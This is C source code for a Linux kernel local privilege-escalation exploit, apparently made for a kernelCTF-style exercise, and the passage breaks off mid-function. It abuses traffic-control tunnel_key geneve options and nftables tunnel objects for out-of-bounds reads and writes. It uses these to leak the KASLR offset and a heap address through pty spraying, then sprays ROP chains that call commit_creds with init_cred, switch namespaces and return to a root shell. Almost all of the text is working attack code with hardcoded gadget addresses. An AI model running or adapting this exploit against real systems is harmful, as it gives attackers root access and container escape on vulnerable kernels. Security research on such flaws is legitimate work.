#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sound/asound.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include <sys/timerfd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <pthread.h>
#include <poll.h>
#include <sys/types.h> /* See NOTES */
#include <sys/socket.h>
#include <arpa/inet.h>
#include <assert.h>
#include <sys/param.h>

#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_cls.h>
#include <linux/tc_act/tc_tunnel_key.h>

#include <libmnl/libmnl.h>
#include <libnftnl/object.h>
#include <libnftnl/table.h>

#include "utils.h"

/**
 * Exploit Note:
 * 1) (why not) use act_tunnel_key geneve + pty spray to leak
 *    KASLR offset and correspond kmalloc-512 heap object address
 * 2) spray ROP data, let's continue to use geneve_opt to save
 *    quite limited, 120 bytes - 15 long values ...
 * 3) spray vicitim nft_tunnel object, leave empty slot, trigger oob write
 * 4) try ROP
 */

// https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-3390_lts_cos_mitigation/docs/exploit.md#53-setup-namespaces
void unshare_setup(uid_t uid, gid_t gid)
{
    int err;
    int temp;
    char edit[0x100];

    err = unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);
    if (err)
    {
        errExit("unshare fail ... check namespace config");
    }

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);

    return;
}

// https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-3390_lts_cos_mitigation/docs/exploit.md#54-pinning-the-cpu
void set_cpu_affinity(int cpu_n, pid_t pid)
{
    cpu_set_t *set = (cpu_set_t *)malloc(sizeof(cpu_set_t));

    CPU_ZERO(set);
    CPU_SET(cpu_n, set);

    if (sched_setaffinity(pid, sizeof(set), set) < 0)
    {
        perror("sched_setaffinity");
        return;
    }
    free(set);
}

void shell()
{
    printf("ret2usr success! uid : %d\n", getuid());
    // char *args[] = {"/bin/sh", "-c", "nsenter --target 1 -m -p;/bin/bash",NULL};
    // char *args[] = {"/bin/sh", "-i", NULL};
    // execve(args[0], args, NULL);
    system("/bin/sh");
}

/////////////////////////////////////
// GLOBAL VARs
/////////////////////////////////////
uint64_t kaslr_offset;
// $2 = {void (struct work_struct *)} 0xffffffff8181e720 <flush_to_ldisc>
uint64_t flush_to_ldisc_base_addr = 0xffffffff8181e720ul;
uint64_t leak_pty_port_addr;
#define LEAK_SPRAY_SLOT_NUM (16)
#define LEAK_SLOT_MUL (4)
int leak_fd[LEAK_SPRAY_SLOT_NUM * LEAK_SLOT_MUL];
struct mnl_socket *rt_mnl_socket;
struct mnl_socket *nft_mnl_socket;
// 0xffffffff831adc80 <dst_blackhole_ops>:
uint64_t dst_blackhole_ops_base_addr = 0xffffffff831adc80ul;
// 0xffffffff8193a3bf : push rsi ; jmp qword ptr [rsi - 0x7f]
uint64_t push_rsi_jmp_addr = 0xffffffff8193a3bful;
// 0xffffffff811a4754 : pop rsp ; ret
uint64_t pop_rsp_ret_addr = 0xffffffff811a4754ul;
// 0xffffffff810f0a07 : pop rsi ; ret
uint64_t pop_rsi_ret_addr = 0xffffffff810f0a07ul;

// NOTE: ... so unfortunate, we failed to find any pop rdi; ret;
// 0xffffffff816b7924 <__xas_prev+20>:	pop    rdi
// 0xffffffff816b7925 <__xas_prev+21>:	sbb    dh,dh
// 0xffffffff816b7927 <__xas_prev+23>:	ret
uint64_t pop_rdi_ret_addr = 0xffffffff816b7924ul;
// 0xffffffff8151783e <fuse_dev_alloc+158>:	rex.WRX xchg rdi,rax
uint64_t xchg_rdi_rax_one_base_addr = 0xffffffff8151783eul;
// $2 = (struct cred *) 0xffffffff82e8b2a0 <init_cred>
uint64_t init_cred_base_addr = 0xffffffff82e8b2a0ul;
// 0xffffffff810f8dd0 <commit_creds>:
uint64_t commit_creds_base_addr = 0xffffffff810f8dd0ul;
// 0xffffffff810eecd0 <find_task_by_vpid>
uint64_t find_task_by_vpid_base_addr = 0xffffffff810eecd0ul;
// $3 = (struct nsproxy *) 0xffffffff82e8b060 <init_nsproxy>
uint64_t init_nsproxy_base_addr = 0xffffffff82e8b060ul;
// 0xffffffff810f74d0 <switch_task_namespaces>
uint64_t switch_task_namespaces_base_addr = 0xffffffff810f74d0ul;
// 0xffffffff81e0131c <asm_load_gs_index+12>:	swapgs
uint64_t swapgs_pop_ret_base_addr = 0xffffffff81e0131cul;
// 0xffffffff810002e0 : iretq
uint64_t iretq_base_addr = 0xffffffff810002e0ul;
// 0xffffffff81095158 <virtual_mapped+48>:	pop    r12
// 0xffffffff8109515a <virtual_mapped+50>:	pop    rbp
// 0xffffffff8109515b <virtual_mapped+51>:	pop    rbx
// 0xffffffff8109515c <virtual_mapped+52>:	ret
uint64_t pop_pop_pop_ret_base_addr = 0xffffffff81095158ul;
uint64_t pop_pop_ret_base_addr = 0xffffffff8109515aul;
// 0xffffffff81081d16 : pop rbp ; ret
uint64_t pop_rbp_ret_base_addr = 0xffffffff81081d16ul;
// ret2usr version
// 0xffffffff81e011a6 <common_interrupt_return+54>:	mov    rdi,rsp
uint64_t common_interrupt_return_base_addr = 0xffffffff81e011a6ul;

uint64_t user_cs, user_ss, user_rsp, user_rflags;

#define MY_NFT_TABLE_NAME ("mytable")
#define MY_NFT_OBJ_NAME ("myobj")

#define OOBW_SPRAY_SLOT_NUM (64)

static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags) : : "memory");
}

void prepare()
{
    LOG_INFO("Do exploit preparing");

    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    LOG_INFO("- finish setvbuf");

    // 1) call unshare to enter into user namespaces
    unshare_setup(getuid(), getgid());
    LOG_INFO("- finish unshare()");

    // 2) pin CPU
    set_cpu_affinity(0, 0);
    LOG_INFO("- finish CPU pining");

    // 3) sockets
    rt_mnl_socket = mnl_socket_open(NETLINK_ROUTE);
    if (!rt_mnl_socket)
        errExit("mnl_socket_open (ROUTE) failed");

    nft_mnl_socket = mnl_socket_open(NETLINK_NETFILTER);
    if (!nft_mnl_socket)
        errExit("mnl_socket_open (NFT) failed");

    save_state();

    LOG_DEBUG("user_cs : %lx", user_cs);
    LOG_DEBUG("user_ss : %lx", user_ss);
    LOG_DEBUG("user_rsp : %lx", user_rsp);
    LOG_DEBUG("user_rflags : %lx", user_rflags);
}

/////////////////////////////////////
// LEAK
/////////////////////////////////////
struct geneve_opt_hdr
{
    uint16_t opt_class;
    uint8_t type;
#ifdef __LITTLE_ENDIAN_BITFIELD
    uint8_t length : 5;
    uint8_t r3 : 1;
    uint8_t r2 : 1;
    uint8_t r1 : 1;
#else
    uint8_t r1 : 1;
    uint8_t r2 : 1;
    uint8_t r3 : 1;
    uint8_t length : 5;
#endif
};

static void prepare_oob_opts(struct nlmsghdr *nlh)
{
    uint8_t stack_buf[0x100] = {0};

    // craft array of LWTUNNEL_IP_OPTS_GENEVE
    // 0xfc = (0x80 + 0x4) + (0x74 + 0x4)
    struct nlattr *anchor = mnl_attr_nest_start(nlh, TCA_TUNNEL_KEY_ENC_OPTS_GENEVE);
    mnl_attr_put_u16(nlh, TCA_TUNNEL_KEY_ENC_OPT_GENEVE_CLASS, 0);
    mnl_attr_put_u8(nlh, TCA_TUNNEL_KEY_ENC_OPT_GENEVE_TYPE, 0);
    // the first option is just a lift, ok to be all zero
    mnl_attr_put(nlh, TCA_TUNNEL_KEY_ENC_OPT_GENEVE_DATA, 0x74, stack_buf);
    mnl_attr_nest_end(nlh, anchor);
    // the second one (vulnerable)
    anchor = mnl_attr_nest_start(nlh, TCA_TUNNEL_KEY_ENC_OPTS_GENEVE);
    mnl_attr_put_u16(nlh, TCA_TUNNEL_KEY_ENC_OPT_GENEVE_CLASS, 0);
    mnl_attr_put_u8(nlh, TCA_TUNNEL_KEY_ENC_OPT_GENEVE_TYPE, 0);

    // remaining length is 0x84
    // leak layout, aim to leak as many as possible
    struct geneve_opt_hdr *gopt_hdr = (void *)stack_buf;
    gopt_hdr->length = (0x80 - 4 - 4) / 4;
    memset(gopt_hdr + 1, 'A', 0x80 - 4 - 4);
    gopt_hdr = (void *)(stack_buf + 0x80 - 4);
    gopt_hdr->length = (0x80 - 4) / 4; // max one
    mnl_attr_put(nlh, TCA_TUNNEL_KEY_ENC_OPT_GENEVE_DATA, 0x80, stack_buf);
    mnl_attr_nest_end(nlh, anchor);
}

static void prepare_leak_msg(struct nlmsghdr *nlh)
{
    struct tcmsg *tcmsgptr;
    // * header
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
    nlh->nlmsg_type = RTM_NEWTFILTER;
    nlh->nlmsg_pid = mnl_socket_get_portid(rt_mnl_socket);
    tcmsgptr = mnl_nlmsg_put_extra_header(nlh, sizeof(struct tcmsg));
    tcmsgptr->tcm_family = AF_UNSPEC;
    tcmsgptr->tcm_handle = 1;
    tcmsgptr->tcm_ifindex = 0x1; // TODO: query `lo` index instead
    tcmsgptr->tcm_parent = 0x10000;
    tcmsgptr->tcm_info = 0x640008;
    // * attrs - rtm_tca_policy
    mnl_attr_put_str(nlh, TCA_KIND, "fw");
    struct nlattr *anchor_tca_options = mnl_attr_nest_start(nlh, TCA_OPTIONS);
    // * attrs - fw_policy
    mnl_attr_put_u32(nlh, TCA_FW_CLASSID, 0x10010);
    // * attrs - tcf_action_policy
    struct nlattr *anchor_fw_act = mnl_attr_nest_start(nlh, TCA_FW_ACT);
    // * attrs - act array
    struct nlattr *anchor_act_1 = mnl_attr_nest_start(nlh, 1);
    mnl_attr_put_str(nlh, TCA_ACT_KIND, "tunnel_key");
    // * attrs - tunnel_key_policy
    struct nlattr *anchor_act_options = mnl_attr_nest_start(nlh, TCA_ACT_OPTIONS);
    struct tc_tunnel_key param = {0};
    param.index = 0; // 0 for auto index
    param.t_action = TCA_TUNNEL_KEY_ACT_SET;
    mnl_attr_put(nlh, TCA_TUNNEL_KEY_PARMS, sizeof(param), &param);
    in_addr_t ipv4_src, ipv4_dst;
    ipv4_src = inet_addr("8.8.8.8");
    ipv4_dst = inet_addr("9.9.9.9");
    mnl_attr_put(nlh, TCA_TUNNEL_KEY_ENC_IPV4_SRC, sizeof(ipv4_src), &ipv4_src);
    mnl_attr_put(nlh, TCA_TUNNEL_KEY_ENC_IPV4_DST, sizeof(ipv4_dst), &ipv4_dst);

    // our main character, TCA_TUNNEL_KEY_ENC_OPTS
    struct nlattr *anchor_enc_opts = mnl_attr_nest_start(nlh, TCA_TUNNEL_KEY_ENC_OPTS);
    prepare_oob_opts(nlh);

    mnl_attr_nest_end(nlh, anchor_enc_opts);
    mnl_attr_nest_end(nlh, anchor_act_options);
    mnl_attr_nest_end(nlh, anchor_act_1);
    mnl_attr_nest_end(nlh, anchor_fw_act);
    mnl_attr_nest_end(nlh, anchor_tca_options);
}

void leak_process()
{
    bool result;
    struct nlmsghdr *nlh;
    char buf[MNL_SOCKET_BUFFER_SIZE];

    if (mnl_socket_bind(rt_mnl_socket, 1 << (RTNLGRP_TC - 1), MNL_SOCKET_AUTOPID))
        errExit("mnl_socket_bind failed");

    // spray pty ports
    for (int i = 0; i < LEAK_SPRAY_SLOT_NUM * LEAK_SLOT_MUL; i++)
    {
        leak_fd[i] = open("/dev/ptmx", O_RDWR);
        if (leak_fd[i] < 0)
        {
            perror("open ptmx");
            break;
        }
    }

    // release every SLOT one, so every adjacent one could
    // poosibly be our taint data
    for (int i = 0; i < LEAK_SPRAY_SLOT_NUM; i++)
    {
        int index = i * LEAK_SLOT_MUL;
        if (leak_fd[index] > 0)
        {
            close(leak_fd[index]);
            leak_fd[index] = -1;
        }
    }

    memset(buf, 0, sizeof(buf));
    // * header
    nlh = mnl_nlmsg_put_header(buf);
    prepare_leak_msg(nlh);

    ssize_t sent = mnl_socket_sendto(rt_mnl_socket, nlh, nlh->nlmsg_len);
    if (sent < 0)
        errExit("mnl_socket_sendto for RTM_NEWTFILTER");
    else
        LOG_DEBUG("mnl_socket_sendto (RTM_NEWTFILTER) send %lu bytes", sent);

    while (1)
    {
        // NOTE: by debugging, the first notify is `RTM_NEWCHAIN`
        memset(buf, 0, sizeof(buf));
        ssize_t received = mnl_socket_recvfrom(rt_mnl_socket, buf, sizeof(buf));
        // ssize_t received = recv(mnl_socket_get_fd(rt_mnl_socket), buf, sizeof(buf), MSG_DONTWAIT);
        LOG_DEBUG("mnl_socket_recvfrom got %lu bytes (tc_chain_notify)", received);

        nlh = (void *)buf;
        if (nlh->nlmsg_type == RTM_NEWTFILTER)
        {
#ifdef DEBUG
            printf("hex dump %ld bytes\n", received);
            buffer2hex(buf, received);
            puts("");
#endif
            uint64_t *suppose_leaked_ptr = (uint64_t *)(buf + 0x274); // 0x274 is via debugging
            uint64_t oob_leaked_val = *suppose_leaked_ptr;
            if ((oob_leaked_val >> 32) == 0xfffffffful && ((oob_leaked_val & 0xfff) == (flush_to_ldisc_base_addr & 0xfff)))
            {
                result = true;
                kaslr_offset = oob_leaked_val - flush_to_ldisc_base_addr;
                LOG_INFO("Successfully leak KASLR offset: %lx via .text pointer: %lx", kaslr_offset, oob_leaked_val);
                // also include heap data TODO
                uint64_t oob_leaked_heap_val = *(uint64_t *)(buf + 0x254);
                leak_pty_port_addr = oob_leaked_heap_val & ~(0x200 - 1);
                LOG_INFO("Successfully leak object address: %lx via heap pointer: %lx", leak_pty_port_addr, oob_leaked_heap_val);
                goto finish;
            }
            else
            {
                LOG_ERROR("Failed to get .text pointer, try again...");
                result = false;
                goto finish;
            }
        }
        else
        {
            if (nlh->nlmsg_type == RTM_NEWCHAIN || nlh->nlmsg_type == RTM_DELCHAIN)
                continue;
            else
            {
                LOG_ERROR("Unexpected message type %x", nlh->nlmsg_type);
                result = false;
                goto finish;
            }
        }
    }

finish:
    if (!result)
        errExit("Failed in leak process, try again");
}

/////////////////////////////////////
// OOB WRITE
/////////////////////////////////////

// our batch message wrapper
static int nlmsg_sub_send_one_batch(
    int sockfd,
    unsigned char *buf,
    unsigned int length,
    int flags)
{
    // Since the begin and end is boring and should not be fuzz at all ...
    // thus, wrap constant head and tail here :D
    struct msghdr msghdr = {0};
    struct iovec iov[3];
    // unsigned char head[sizeof(struct nlmsghdr) + sizeof(struct nfgenmsg)] = {0};
    unsigned char head[0x2000] = {0};
    unsigned char tail[sizeof(struct nlmsghdr) + sizeof(struct nfgenmsg)] = {0};

    // setup `begin`
    struct nlmsghdr *headmsg = (struct nlmsghdr *)head;
    struct nfgenmsg *headnfgen = (struct nfgenmsg *)(head + 16);
    headmsg->nlmsg_len = sizeof(struct nlmsghdr) + sizeof(struct nfgenmsg) + 0xec0;
    headmsg->nlmsg_type = NFNL_MSG_BATCH_BEGIN;
    headmsg->nlmsg_flags |= NLM_F_REQUEST;
    // nfgen_family and version not accessed, OK to leave it zero
    headnfgen->res_id = 10; // NFNL_SUBSYS_NFTABLES and host order, other subsys id is booooring

    // setup `tail`
    struct nlmsghdr *tailmsg = (struct nlmsghdr *)tail;
    // kernel will not access `nfgenmsg` of the END nlmsg
    // struct nfgenmsg *tailgen = (struct nfgenmsg*)(tail + 16);
    tailmsg->nlmsg_len = sizeof(struct nlmsghdr) + sizeof(struct nfgenmsg);
    tailmsg->nlmsg_type = NFNL_MSG_BATCH_END;
    tailmsg->nlmsg_flags |= NLM_F_REQUEST;

    // put it altogther
    iov[0].iov_base = head;
    iov[0].iov_len = sizeof(struct nlmsghdr) + sizeof(struct nfgenmsg) + 0xec0;
    iov[1].iov_base = buf;
    iov[1].iov_len = length;
    iov[2].iov_base = tail;
    iov[2].iov_len = sizeof(struct nlmsghdr) + sizeof(struct nfgenmsg);
    msghdr.msg_iov = iov;
    msghdr.msg_iovlen = 3;

    return sendmsg(sockfd, &msghdr, flags);
}

static void prepare_spray_msg(struct nlmsghdr *nlh, int salt)
{
    struct tcmsg *tcmsgptr;

    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
    nlh->nlmsg_type = RTM_NEWTFILTER;
    nlh->nlmsg_pid = mnl_socket_get_portid(rt_mnl_socket);
    tcmsgptr = mnl_nlmsg_put_extra_header(nlh, sizeof(struct tcmsg));
    tcmsgptr->tcm_family = AF_UNSPEC;
    tcmsgptr->tcm_handle = salt; // XXX: different handle to different cls
    tcmsgptr->tcm_ifindex = 0x1;
    tcmsgptr->tcm_parent = 0x10000;
    tcmsgptr->tcm_info = 0x640008;
    mnl_attr_put_str(nlh, TCA_KIND, "fw");
    struct nlattr *anchor_tca_options = mnl_attr_nest_start(nlh, TCA_OPTIONS);
    mnl_attr_put_u32(nlh, TCA_FW_CLASSID, 0x10010);
    struct nlattr *anchor_fw_act = mnl_attr_nest_start(nlh, TCA_FW_ACT);
    struct nlattr *anchor_act_1 = mnl_attr_nest_start(nlh, 1);
    mnl_attr_put_str(nlh, TCA_ACT_KIND, "tunnel_key");
    struct nlattr *anchor_act_options = mnl_attr_nest_start(nlh, TCA_ACT_OPTIONS);
    struct tc_tunnel_key param = {0};
    param.index = 0; // 0 for auto index
    param.t_action = TCA_TUNNEL_KEY_ACT_SET;
    mnl_attr_put(nlh, TCA_TUNNEL_KEY_PARMS, sizeof(param), &param);
    in_addr_t ipv4_src, ipv4_dst;
    ipv4_src = inet_addr("8.8.8.8");
    ipv4_dst = inet_addr("9.9.9.9");
    mnl_attr_put(nlh, TCA_TUNNEL_KEY_ENC_IPV4_SRC, sizeof(ipv4_src), &ipv4_src);
    mnl_attr_put(nlh, TCA_TUNNEL_KEY_ENC_IPV4_DST, sizeof(ipv4_dst), &ipv4_dst);
    struct nlattr *anchor_enc_opts = mnl_attr_nest_start(nlh, TCA_TUNNEL_KEY_ENC_OPTS);

    // XXX: part1 payload
    //      part1 is where we do indeed ROP
    struct nlattr *anchor_1 = mnl_attr_nest_start(nlh, TCA_TUNNEL_KEY_ENC_OPTS_GENEVE);
    mnl_attr_put_u16(nlh, TCA_TUNNEL_KEY_ENC_OPT_GENEVE_CLASS, 0x4141);
    mnl_attr_put_u8(nlh, TCA_TUNNEL_KEY_ENC_OPT_GENEVE_TYPE, 0x41);
    uint8_t part1_buf[120] = {0};
    // memset(part1_buf, 'A', sizeof(part1_buf));
    // : pop rdi; ret
    // : init_cred
    // : commit_creds
    // : pop rdi; ret
    // : 1
    // : find_task_by_vpid
    // : pop rdi; ret
    // : 0
    // : ~~ or rdi, rax ; test rdi, rdi ; setne al ; ret ~~
    // : pop rsi; ret
    // : init_nsproxy
    // : switch_task_namespaces
    // : swapgs
    // : iretq
    // : shell return
    // : cs
    // : rflags
    // : rsp
    // : user ss
    uint64_t *rop_ptr = (void *)(part1_buf + 4); // be careful of this 4 bytes gap
    rop_ptr[0] = pop_rdi_ret_addr + kaslr_offset;
    rop_ptr[1] = init_cred_base_addr + kaslr_offset;
    rop_ptr[2] = commit_creds_base_addr + kaslr_offset;
    rop_ptr[3] = pop_rdi_ret_addr + kaslr_offset;
    rop_ptr[4] = 1;
    rop_ptr[5] = find_task_by_vpid_base_addr + kaslr_offset;
    // NOTE: how to put `rax` to `rdi` ???
    // XXXX: this gadget will call `leave`, which will update rsp via rbp
    //       hence, we need to hijack rbp first
    rop_ptr[6] = pop_rbp_ret_base_addr + kaslr_offset;
    rop_ptr[7] = leak_pty_port_addr + 0x110; // via debugging
    rop_ptr[8] = xchg_rdi_rax_one_base_addr + kaslr_offset;
    rop_ptr[9] = pop_rsi_ret_addr + kaslr_offset;
    rop_ptr[10] = init_nsproxy_base_addr + kaslr_offset;
    rop_ptr[11] = switch_task_namespaces_base_addr + kaslr_offset;
    rop_ptr[12] = pop_pop_ret_base_addr + kaslr_offset;

    mnl_attr_put(nlh, TCA_TUNNEL_KEY_ENC_OPT_GENEVE_DATA, 120, part1_buf);
    mnl_attr_nest_end(nlh, anchor_1);
    // XXX: part2 payload
    struct nlattr *anchor_2 = mnl_attr_nest_start(nlh, TCA_TUNNEL_KEY_ENC_OPTS_GENEVE);
    mnl_attr_put_u16(nlh, TCA_TUNNEL_KEY_ENC_OPT_GENEVE_CLASS, 0x4242);
    mnl_attr_put_u8(nlh, TCA_TUNNEL_KEY_ENC_OPT_GENEVE_TYPE, 0x42);
    uint8_t part2_buf[120] = {0};
    // memset(part2_buf, 'B', sizeof(part2_buf));
    rop_ptr = (void *)(part2_buf);
    // NOTE: ret2usr, jmp to syscall_return_via_sysret path
    // 0xffffffff81e001b3 <entry_SYSCALL_64+307>:	pop    r11
    // 0xffffffff81e011a6 <common_interrupt_return+54>:	mov    rdi,rsp
    rop_ptr[0] = common_interrupt_return_base_addr + kaslr_offset;
    rop_ptr[3] = (uint64_t)shell;
    rop_ptr[4] = user_cs;
    rop_ptr[5] = user_rflags;
    rop_ptr[6] = user_rsp | 8;
    rop_ptr[7] = user_ss;

    // the last slot is fake DUMP op function
    uint64_t *fake_dump_op_ptr = (uint64_t *)(part2_buf + 120 - 0x10 - 8);
    *fake_dump_op_ptr = push_rsi_jmp_addr + kaslr_offset;
    uint64_t *fake_obj_type = (uint64_t *)(part2_buf + 120 - 8);
    *fake_obj_type = (leak_pty_port_addr + 0x1b8 - 0x8 - 0x20);
    uint32_t *fake_obj_type_type = (uint32_t *)(part2_buf + 120 - 0x10);
    *fake_obj_type_type = NFT_OBJECT_TUNNEL;

    mnl_attr_put(nlh, TCA_TUNNEL_KEY_ENC_OPT_GENEVE_DATA, 120, part2_buf);
    mnl_attr_nest_end(nlh, anchor_2);

    mnl_attr_nest_end(nlh, anchor_enc_opts);
    mnl_attr_nest_end(nlh, anchor_act_options);
    mnl_attr_nest_end(nlh, anchor_act_1);
    mnl_attr_nest_end(nlh, anchor_fw_act);
    mnl_attr_nest_end(nlh, anchor_tca_options);
}

void rop_spray_process()
{
    // we know the lwtunnel address is leak_pty_port_addr - 0x200
    // the idea here is to release that object
    // try reclaim it by spraying some NFTA_OBJ_USERDATA
    struct nlmsghdr *nlh;
    char buf[MNL_SOCKET_BUFFER_SIZE];

    // 1. release all ttys
    for (int i = 0; i < LEAK_SPRAY_SLOT_NUM * LEAK_SLOT_MUL; i++)
    {
        if (leak_fd[i] > 0)
        {
            close(leak_fd[i]);
            leak_fd[i] = -1;
        }
    }

    // 2. spray enough objects
    //    here at least * 2 because one pty fd maps 2 kmalloc-512 objects
    int boundary = MIN(LEAK_SPRAY_SLOT_NUM * LEAK_SLOT_MUL * 2, 192);
    for (int i = 0; i < boundary; i++)
    {
        memset(buf, 0, sizeof(buf));
        // * header
        nlh = mnl_nlmsg_put_header(buf);
        prepare_spray_msg(nlh, i + 2);
        mnl_socket_sendto(rt_mnl_socket, nlh, nlh->nlmsg_len);
    }

    // 3. check by OOB read again :D
    // $2 = (struct dst_ops *) 0xffffffff831adc80 <dst_blackhole_ops>
    // let's use another socket here
    struct mnl_socket *tmp_mnl_socket = mnl_socket_open(NETLINK_ROUTE);
    mnl_socket_bind(tmp_mnl_socket, 1 << (RTNLGRP_TC - 1), MNL_SOCKET_AUTOPID);

    memset(buf, 0, sizeof(buf));
    nlh = mnl_nlmsg_put_header(buf);
    struct tcmsg *tcmsgptr;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_type = RTM_GETTFILTER;
    nlh->nlmsg_pid = mnl_socket_get_portid(rt_mnl_socket);
    tcmsgptr = mnl_nlmsg_put_extra_header(nlh, sizeof(struct tcmsg));
    tcmsgptr->tcm_family = AF_UNSPEC;
    tcmsgptr->tcm_handle = 1;
    tcmsgptr->tcm_ifindex = 0x1;
    tcmsgptr->tcm_parent = 0x10000;
    tcmsgptr->tcm_info = 0x640008;
    // believe this is enough
    mnl_socket_sendto(tmp_mnl_socket, nlh, nlh->nlmsg_len);

    while (1)
    {
        // NOTE: by debugging, the first notify is `RTM_NEWCHAIN`
        memset(buf, 0, sizeof(buf));
        ssize_t received = mnl_socket_recvfrom(tmp_mnl_socket, buf, sizeof(buf));
        LOG_DEBUG("mnl_socket_recvfrom got %lu bytes (tc_chain_notify)", received);

        nlh = (void *)buf;
        if (nlh->nlmsg_type == RTM_NEWTFILTER)
        {
#ifdef DEBUG
            printf("hex dump %ld bytes\n", received);
            buffer2hex(buf, received);
            puts("");
#endif
            uint64_t leak_dst_ops_addr = *(uint64_t *)(buf + 0x25c);
            if (leak_dst_ops_addr == dst_blackhole_ops_base_addr + kaslr_offset)
            {
                LOG_INFO("Successfully spray ROP data at object %lx", leak_pty_port_addr);
                break;
            }
            else
            {
                errExit("ROP Spray failed to place payload at target location...");
            }
        }
        else
        {
            continue;
        }
    }

    // do not clean that
    // mnl_socket_close(tmp_mnl_socket);
}

static void spray_nft_tunnel_object(int i)
{
    struct nlmsghdr *nlh;
    struct nfgenmsg *nfgenptr;
    char buf[MNL_SOCKET_BUFFER_SIZE];
    char namebuf[32] = {0};

    memset(buf, 0, sizeof(buf));
    sprintf(namebuf, "tunnel%d", i);

    nlh = mnl_nlmsg_put_header(buf);
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
    nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWOBJ;
    nfgenptr = mnl_nlmsg_put_extra_header(nlh, sizeof(struct nfgenmsg));
    nfgenptr->nfgen_family = NFPROTO_NETDEV;

    mnl_attr_put_u32(nlh, NFTA_OBJ_TYPE, htonl(NFT_OBJECT_TUNNEL));
    mnl_attr_put_str(nlh, NFTA_OBJ_TABLE, MY_NFT_TABLE_NAME);
    mnl_attr_put_str(nlh, NFTA_OBJ_NAME, namebuf);

    struct nlattr *anchor_obj_data = mnl_attr_nest_start(nlh, NFTA_OBJ_DATA);
    mnl_attr_put_u32(nlh, NFTA_TUNNEL_KEY_ID, 0x0);
    struct nlattr *anchor_key_ip = mnl_attr_nest_start(nlh, NFTA_TUNNEL_KEY_IP);
    in_addr_t ipv4_src, ipv4_dst;
    ipv4_src = inet_addr("8.8.8.8");
    ipv4_dst = inet_addr("9.9.9.9");
    mnl_attr_put(nlh, NFTA_TUNNEL_KEY_IP_SRC, sizeof(ipv4_src), &ipv4_src);
    mnl_attr_put(nlh, NFTA_TUNNEL_KEY_IP_DST, sizeof(ipv4_dst), &ipv4_dst);
    mnl_attr_nest_end(nlh, anchor_key_ip);
    // ignore `NFTA_TUNNEL_KEY_OPTS` in spray case
    mnl_attr_nest_end(nlh, anchor_obj_data);
    nlmsg_sub_send_one_batch(mnl_socket_get_fd(nft_mnl_socket), (char *)nlh, nlh->nlmsg_len, 0);
}

static int setup_oob_opts(struct nlmsghdr *nlh)
{
    char stack_buf[MNL_SOCKET_BUFFER_SIZE];

    // opts.u.data starts from * 0x8 *
    // (remote) gefâž¤  p &((struct nft_object*)0xffff888109a10800)->data
    // $12 = (unsigned char (*)[]) 0xffff888109a10888
    // data is at 0x88 offset in nft_object
    int32_t actual_data_offset = -0x4 + (0x200 - 0x8 - 0x88);
    if (actual_data_offset < 0 || actual_data_offset % 4 != 0)
    {
        LOG_ERROR("Currently not supported data offset");
        return -1;
    }

    if (actual_data_offset / 4 > 255 /* IP_TUNNEL_OPTS_MAX */)
    {
        LOG_ERROR("Too large data offset");
        return -1;
    }

    struct nlattr *anchor_tunnel_key_opts = mnl_attr_nest_start(nlh, NFTA_TUNNEL_KEY_OPTS);
    // NOTE: the idea is to craft some JUMP opts first
    //       which will overwrite opts.len to ensure next opt nlattr
    //       could be exactly the target location.

    struct nlattr *anchor_opts_genve;

    // OPT-1
    // in opt-2, we want to control the offset 0xf0 to 0x104 (via data)
    // (0xf0 - 4) / 4 = 59, align to 56
    anchor_opts_genve = mnl_attr_nest_start(nlh, NFTA_TUNNEL_KEY_OPTS_GENEVE);
    mnl_attr_put_u16(nlh, NFTA_TUNNEL_KEY_GENEVE_CLASS, 0);
    mnl_attr_put_u8(nlh, NFTA_TUNNEL_KEY_GENEVE_TYPE, 0);
    memset(stack_buf, 'A', sizeof(stack_buf));
    mnl_attr_put(nlh, NFTA_TUNNEL_KEY_GENEVE_DATA, 56 - 4, stack_buf); // -4 means geneve_opt hdr
    mnl_attr_nest_end(nlh, anchor_opts_genve);

    // OPT-2
    // now, the length is 56, offset to 0xe0, hijack 0xe0 - 0x104 and alter the length
    anchor_opts_genve = mnl_attr_nest_start(nlh, NFTA_TUNNEL_KEY_OPTS_GENEVE);
    // NOTE: two bytes quite enough
    mnl_attr_put_u16(nlh, NFTA_TUNNEL_KEY_GENEVE_CLASS, 0); // 0xe0
    mnl_attr_put_u8(nlh, NFTA_TUNNEL_KEY_GENEVE_TYPE, 0);   // 0xe2
    // netfiler parsing accepts 0 length data :D
    // 0xffffffff8193a3bf : push rsi ; jmp qword ptr [rsi - 0x7f]
    // the offset is at 4 + 8 + 1 = 13
    memset(stack_buf, 'B', sizeof(stack_buf));
    uint64_t *migrate_gadget1_ptr = (uint64_t *)(stack_buf + 13);
    *migrate_gadget1_ptr = pop_rsp_ret_addr + kaslr_offset;

